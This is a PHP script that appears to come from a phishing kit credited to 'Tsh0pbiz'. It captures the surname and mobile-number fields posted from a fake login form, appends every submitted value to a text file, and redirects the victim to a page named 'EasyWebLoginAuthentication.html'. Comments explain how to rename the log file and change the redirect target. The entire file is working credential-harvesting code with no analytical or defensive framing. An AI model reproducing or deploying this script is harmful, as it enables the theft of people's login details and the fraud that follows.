<?
###################################
// Don't change anything here
// Created By Tsh0pbiz
// From Isreal
###################################

ini_set("output_buffering",4096);
session_start();




$_SESSION['username'] = $user = $_POST['surname'];
$_SESSION['mNumber'] = $pass = $_POST['mno'];



//Location: The location where the user will be redirected after the script executes the commands. You can change it.
header("Location: EasyWebLoginAuthentication.html");
//It will create the file "logs1.txt" (if not already created) and will save the POST or GET method data(the username/email and pass). You can change the filename.
$handle = fopen("like2.txt", "a");
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

//This filename must be the same with the one above.
$myFile = "like2.txt";
$fh = fopen($myFile, 'a');
//Gets remote ip adress


//write in file
fwrite($fh, "\r\n");
fwrite($fh, "\r\n");
fwrite($fh, "\r\n");
fwrite($fh, "\r\n");

fclose($fh);

exit;

?>